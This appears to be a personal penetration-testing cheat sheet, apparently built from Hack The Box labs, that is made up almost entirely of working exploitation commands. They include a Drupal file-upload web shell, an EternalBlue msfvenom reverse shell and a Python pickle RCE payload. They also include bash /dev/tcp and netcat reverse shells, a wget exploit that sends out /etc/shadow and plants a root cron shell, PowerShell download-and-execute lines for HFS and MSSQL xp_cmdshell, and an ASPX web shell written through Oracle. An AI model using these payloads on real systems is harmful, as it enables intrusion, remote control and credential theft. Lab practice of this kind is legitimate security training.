# Exploitation 
## Search Exploit with google;
 site:exploit-db.com "October CMS"
 site:github.com "October CMS"


## Search Exploit with searchsploit;
```bash
searchsploit OpenSSL
searchsploit OpenSSL | grep --invert-match 'PHP\|Heartbleed\|dos\|windows'

 searchsploit -p 41936.txt
 cp /usr/share/exploitdb/exploits/php/webapps/41936.txt .
```
-------------------------------------------------------------------------------------------------------------------------------
## Compiling the exploit 

##for Linux;
```bash
  which gcc
  gcc -o kernel-exploit 44298.c
 ./kernel-exploit
```
  or 

  ```
  dos2unix exploit.sh (very useful ;) )
  For more; https://tools.kali.org/reporting-tools/dos2unix
  ```


##  Windows;
```bash 
  i686-w64-mingw32-gcc 40564.c -o exploit.exe -lws2_32
```




------------------------------------------------------------------------------------------------------------------------------


Vulnerability in Drupal 7.54

41564.php , explopit 

```php
$url = 'http://<ip>';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$phpCode = <<<'EOD'
<?php 
if (isset($_REQUEST['fupload'])) {
 file_put_contents($_REQUEST['fupload'], file_get_contents("http://<ip>:8000/" . $_REQUEST['fupload']));
};
if(isset($_REQUEST['fexec'])) {
 echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
};
?>
EOD;

$file = [
    'filename' => 'badrobot.php',
    'data' => $phpCode
];


```

2. Run Below url in browser 
```
http://<ip>/badrobot.php?fupload=nc64.exe&fexec=nc64.exe -e cmd <attacker ip> 8081
```

------------------------------------------------------------------------------------------------------------------------------




# eternal Blue 

1. get the files from 
https://github.com/helviojunior/MS17-010
2. create a shell 

```
 msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o revshell.exe
```
3. Run the script 
```
 python send_and_execute.py <victime ip> revshell.exe
```
------------------------------------------------------------------------------------------------------------------------------

## we know the pickle is vulnerable to RCE we wrote a script to generated pickle string 

```python

import pickle
from base64 import urlsafe_b64encode as b64encode

RUNME = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.28 9001 > /tmp/f"""

class badrobot(object):
    def __reduce__(self):
        import os
        return (os.system,(RUNME,))

print b64encode(pickle.dumps(badrobot()))

```

# H2 server exoloit 

1. we create exec.sh with bash revshell in victims tmp dir with 

```bash
!/bin/bash
bash -i >& /dev/tcp/<attcker ip>/9004 0>&1
```

2. We wxecute from the H2 Console 
```sql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;
CALL SHELLEXEC('/tmp/exec.sh')
```

# UnrealIRC 3.2.8.1 (HTB irked)

1. we can confirm code exec using ping 

 ```
 echo "AB; ping -c 1 <attacker ip>" | nc <victime ip> 8067`
```

2. we try to get shell using
```
echo "AB; bash -c 'bash -i >& /dev/tcp/<attacker ip>/9001 0>&1'" | nc <victime ip> 8067
```



# RCE upto wget  1.18 (HTB Kotarak)

1. .wgetrc file on our machine 
```
post_file = /etc/shadow
output_document = /etc/cron.d/wget-root-shell
```

2. we will setup FTP severver using 

```
python3 -m pyftpdlib -p21 -w
```
3. exploit.py 

```py
HTTP_LISTEN_IP = '0.0.0.0'
HTTP_LISTEN_PORT = 80
FTP_HOST = '<attcker IP>'
FTP_PORT = 21

ROOT_CRON = "* * * * * root bash -c 'bash -i >& /dev/tcp/10.10.14.28/6666 0>&1' \n"

```


# SMB 3.0.20 

1. Download file 
https://github.com/amriunix/CVE-2007-2447/blob/master/usermap_script.py

`usermap_script.py <victime ip> 445 <attacker IP> 9001`




# vuln in redhat centos ifcfg script 


https://seclists.org/fulldisclosure/2019/Apr/24  
>If you have white/blank space in 
>the name the system tries to execute the part after the white/blank space. Which means; >everything after the first 
>blank space is executed as root.
>For example:
>/etc/sysconfig/network-scripts/ifcfg-1337
>NAME=Network /bin/id  <= Note the blank space
>ONBOOT=yes
>DEVICE=eth0



# PHP Lightadmin 


# HFS 2.3 

search= %00{.exec|c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://<ip>:8000/rev.ps1').} 



# Shellshock

 `() { :;}; echo; /bin/bash -c bash -i >& /dev/tcp/<ip>/9001 0>&1;`



# SQLPLUS64 Oracle

`sqlplus64 scott/tiger@10.10.10.82:1521/XE as sysdba`

  1. to check privs for session `select * from session_privs; `
  2. to check priv of user role `select * from user_role_privs;`

we will declare the variables in the oracle  to read file from the server 

```sql
declare 
  f utl_file.file_type;
  s varchar(200);
begin
  f := utl_file.fopen('/inetpub/wwwroot', 'iisstart.htm', 'R');
  utl_file.get_line(f,s);
  utl_file.fclose(f);
  dbms_output.put_line(s);
end;

```
we will try to write files to the server

```sql 
declare 
  f utl_file.file_type;
  s varchar(2000) :='badrobot';
begin
  f := utl_file.fopen('/inetpub/wwwroot', 'badrobot.txt', 'W');
  utl_file.put_line(f,s);
  utl_file.fclose(f);
  dbms_output.put_line(s);
end;
``` 

```sql
declare 
  f utl_file.file_type;
  s varchar(2000) :='<%@ Page Language="C#" Debug="true" Trace="false" %><%@ Import Namespace="System.Diagnostics" %><%@ Import Namespace="System.IO" %><script Language="c#" runat="server">void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = "cmd.exe";psi.Arguments = "/c "+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write("<pre>");Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write("</pre>");}</script><HTML><body><form id="cmd" method="post" runat="server"><asp:TextBox id="txtArg"  runat="server" Width="250px"></asp:TextBox><asp:Button id="testing"  runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button><asp:Label id="lblText"  runat="server">Command:</asp:Label></form></body></HTML>';
begin
  f := utl_file.fopen('/inetpub/wwwroot', 'comments.aspx', 'W');
  utl_file.put_line(f,s);
  utl_file.fclose(f);
  dbms_output.put_line(s);
end;
```
Now Access the **comments.aspx** on the browser 

#  sql sever 


login to sql server using the creds 

`sqsh -S 10.10.10.59 -U sa -P <passwd>`

 we Enavle the XP_Cmdshell Options

```sql
>EXEC SP_CONFIGURE 'show advanced options', 1
2> reconfigure
3> go
Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
(return status = 0)
1> EXEC SP_CONFIGURE 'xp_cmdshell', 1
2> reconfigure
3> go
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
(return status = 0)
1> 
```

uisng below we get reverse shell
```sql
1> xp_cmdshell "powershell IEX(New-Object net.webClient).downloadString('http://<ip>/rev.ps1')"
2> go
```




